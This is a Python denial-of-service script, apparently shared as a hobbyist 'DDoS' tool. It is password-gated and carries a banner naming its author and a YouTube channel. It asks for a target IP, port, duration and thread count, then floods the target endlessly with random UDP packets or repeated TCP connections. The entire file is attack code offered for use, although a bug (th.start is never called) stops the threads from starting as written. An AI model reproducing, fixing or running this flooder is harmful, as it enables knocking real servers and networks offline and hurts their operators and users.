import random
import socket
import os
import threading
import time
import getpass

os.system("clear")
password =str(input("\033[97m[•] Password :\033[91m "))
if password == "epekepek":
	print("\033[97m[!] Login \033[92mSuccessfull")
	time.sleep(4)
	
else:
		print("\033[91m[•] Wrong Password")
		time.sleep(9999)
		
os.system("clear")
print("\033[97m[•]\033[95m >>> Code : \033[91mZ1")
time.sleep(2.5)

print("\033[97m[•]\033[95m >>> Youtube :\033[91m Ziel ? DDoS")
time.sleep(1.9)

print("\033[97m[•]\033[95m >>> Create Date :\033[91m 15/Jul/2022")
time.sleep(3.5)

os.system("clear")
print("""
\033[91m ____  __               
(_   )/  )              
 / /_  )(               
(____)(__)              
""")
print("""
\033[97m[•]\033[95m >>> Code :\033[91m Z1
\033[97m[•]\033[95m >>> Youtube :\033[91m Ziel ? DDoS
\033[97m[•]\033[95m >>> Create Date :\033[91m 15/Jul/2022
\033[97m[•]\033[95m >>> Methods :\033[91m UDP
""")

choice =str(input("\033[97m[•]\033[95m >>> Sure?: \033[91m"))
ip =str(input("\033[97m[•]\033[95m >>> Ip : \033[91m"))
port =int(input("\033[97m[•]\033[95m >>> Prot : \033[91m"))
times =int(input("\033[97m[•]\033[95m >>> Time : \033[91m"))
threads =int(input("\033[97m[•]\033[95m >>> Threads : \033[91m"))

def run():
	data = random._urandom(1204)
	i = random.choice(("\033[97m[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr =(str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print(i +"\033[31m Attack Ip \033[96m{} \033[31mPort \033[96m{}".format(ip,port))
		except:
					print("\033[97m[•]\033[31m Attack Ip \033[96m{} \033[31mPort \033[96m{}".format(ip,port))
				
def run2():
	data = random._urandom(16)
	i = random.choice(("\033[97m[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
				print(i +"\033[31m Attack Ip \033[96m{} \033[31mPort \033[96m{}".format(ip,port))
		except:
					s.close()
					print("\033[97m[•]\033[31m Attack Ip \033[96m{} \033[31mPort \033[96m{}".format(ip,port))
					
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start
	else:
		th = threading.Thread(target = run2)
		th.start